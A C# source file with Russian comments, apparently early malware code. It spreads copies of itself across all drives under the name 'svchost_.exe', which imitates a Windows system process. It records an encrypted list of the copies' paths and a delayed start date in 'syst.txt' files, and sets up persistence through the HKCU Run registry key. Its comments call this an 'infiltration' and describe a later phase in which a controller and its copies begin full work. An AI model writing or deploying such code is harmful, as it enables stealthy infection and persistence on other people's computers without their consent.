using System;
using System.IO;
using Microsoft.Win32;

namespace Ninja
{
    class Program
    {
        static void VariantOfStart(ref string[] allDrives)
        {

            Console.WriteLine("\n Запущено проникновение...");
            Console.WriteLine("\n 1 - обход всех дисков.\n 0- обход только локальных С и D");

            string variant = Console.ReadLine();
            switch (variant)
            {
                case "1"://полное покрытие дисков
                    {
                        DriveInfo[] allDisks = DriveInfo.GetDrives();//дает все логические диски, которые доступны с этой машины
                        Array.Resize(ref allDrives, allDisks.Length);
                        allDrives = new string[allDisks.Length];

                        for (int i = 0; i < allDisks.Length; i++)
                        {
                            Console.WriteLine(allDisks[i].Name);
                            allDrives[i] = allDisks[i].Name;
                        }
                        break;
                    }
                case "0"://личные диски(для тестов)
                    {
                        allDrives[0] = @"C:\";
                        allDrives[1] = @"D:\";
                        break;
                    }
            }
        }
        static void CopyToBootLoader(string filePath, string appName)//прописывается в автозагрузчик(win10)
        {
            using (RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"))
            {
                reg.SetValue(appName, filePath);
            }
        }
        static void AddAdressList(string[] lastAdress)//каждой удачно проникшей копии выдаем список с адресами всех остальных копий+ дата запуска
        {
            string filePath = "";
            int latencyToStart = 2;
            lastAdress[lastAdress.Length-1] = Crypter.Encode( DateTime.Now.AddDays(latencyToStart).ToString(),false);//время тоже шифруем
            
Console.WriteLine("\n");
            for (int f = 0; f < lastAdress.Length-1; f++)//проход только реальных адресов!
            {
                string[] split = Crypter.Encode(lastAdress[f],false).Split(new char[] { '\\' });//расшифровываем

                for (int i = 0; i < split.Length - 1; i++)
                {
                    if (i > 0)
                        filePath = string.Concat(filePath, @"\" + split[i]);
                    else
                        filePath = string.Concat(filePath, split[i]);
                }
                filePath += @"\syst.txt";

Console.WriteLine($"\n encoded   last adr = + {Crypter.Encode(lastAdress[f],false)}   systPath ={filePath}");
                

                //тут надо шифровать весь адрессный массив
                File.AppendAllLines(filePath, lastAdress);//в файл копируем все адреса и дату

                filePath = "";
            }
        }





        static void Main(string[] args)
        {
            string invaderName ="svchost_.exe";//копия
            int invaderCopies = 2;//сколько копий нужно создать 



            string[] allDrives = new string[2];//стандартный набор любого ПК
            VariantOfStart(ref allDrives);

            string[] allInvaderNames = new string[invaderCopies];
            for(int i=0;i<invaderCopies;i++)
            {
                allInvaderNames[i] = invaderName;
            }
            string[] lastAdress = new string[invaderCopies+1];// пути, куда просочились проги.Это позволит потом каждую из них найти(после успешного внедрения).
                                                              // Последняя ячейка - дата, после которой, можно начинать полноценную работу управленец+копия

            Invase.InsertCopyes(allDrives,allInvaderNames,ref lastAdress);
            AddAdressList(lastAdress);
            CopyToBootLoader(lastAdress[0], invaderName);

Console.ReadLine();
        }
    }
}
